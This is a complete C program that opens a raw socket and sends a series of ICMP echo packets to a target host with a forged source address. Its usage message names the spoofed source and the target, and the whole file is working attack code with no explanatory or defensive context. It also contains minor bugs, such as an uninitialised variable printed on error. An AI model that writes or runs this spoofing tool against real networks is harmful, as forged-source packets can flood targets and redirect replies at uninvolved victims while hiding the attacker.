#include <stdio.h>

#include <sys/types.h>

#include <sys/socket.h>

#include <netdb.h>

#include <netinet/in.h>

#include <netinet/in_systm.h>

#include <netinet/ip.h>

#include <netinet/ip_icmp.h>

#include <string.h>

#include <arpa/inet.h>

#include<stdlib.h>

 

int main(int argc, char *argv[])

{

  int s, i;

  char buf[400];

  struct ip *ip = (struct ip *)buf;

  struct icmphdr *icmp = (struct icmphdr *)(ip + 1);

  struct hostent *hp, *hp2;

  struct sockaddr_in dst;

  int offset;

  int on;

  int num = 100;

 

  if(argc < 3)

  {

     printf("\nUsage: %s <saddress> <dstaddress> [number]\n", argv[0]);

     printf("- saddress is the spoofed source address\n");

     printf("- dstaddress is the target\n");

     printf("- number is the number of packets to send, 100 is the default\n");

     exit(1);

   }

 

  /* If enough argument supplied */

  if(argc == 4)

      /* Copy the packet number */

      num = atoi(argv[3]);

 

    /* Loop based on the packet number */

    for(i=1;i<=num;i++)

    {

       on = 1;

       bzero(buf, sizeof(buf));

 

       /* Create RAW socket */

       if((s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0)

       {

        perror("socket() error");

        /* If something wrong, just exit */

        exit(1);

       }

 

       /* socket options, tell the kernel we provide the IP structure */

       if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)

       {

        perror("setsockopt() for IP_HDRINCL error");

        exit(1);

       }

 

       if((hp = gethostbyname(argv[2])) == NULL)

       {

         if((ip->ip_dst.s_addr = inet_addr(argv[2])) == -1)

         {

            fprintf(stderr, "%s: Can't resolve, unknown host.\n", argv[2]);

            exit(1);

         }

       }

       else

           bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);

 

        /* The following source address just redundant for target to collect */

        if((hp2 = gethostbyname(argv[1])) == NULL)

        {

         if((ip->ip_src.s_addr = inet_addr(argv[1])) == -1)

         {

             fprintf(stderr, "%s: Can't resolve, unknown host\n", argv[1]);

             exit(1);

         }

        }

        else

            bcopy(hp2->h_addr_list[0], &ip->ip_src.s_addr, hp->h_length);

 

        printf("Sending to %s from spoofed %s\n", inet_ntoa(ip->ip_dst), argv[1]);

 

        /* Ip structure, check the ip.h */

        ip->ip_v = 4;

        ip->ip_hl = sizeof*ip >> 2;

        ip->ip_tos = 0;

        ip->ip_len = htons(sizeof(buf));

        ip->ip_id = htons(4321);

        ip->ip_off = htons(0);

        ip->ip_ttl = 255;

        ip->ip_p = 1;

        ip->ip_sum = 0; /* Let kernel fills in */

 

        dst.sin_addr = ip->ip_dst;

        dst.sin_family = AF_INET;

 

        icmp->type = ICMP_ECHO;

        icmp->code = 0;

        /* Header checksum */

        icmp->checksum = htons(~(ICMP_ECHO << 8));

 

        /* sending time */

        if(sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0)

        {

           fprintf(stderr, "offset %d: ", offset);

           perror("sendto() error");

        }

     else

       printf("sendto() is OK.\n");

 

      /* close socket */

      close(s);

      usleep(30000);

     }

    return 0;

}
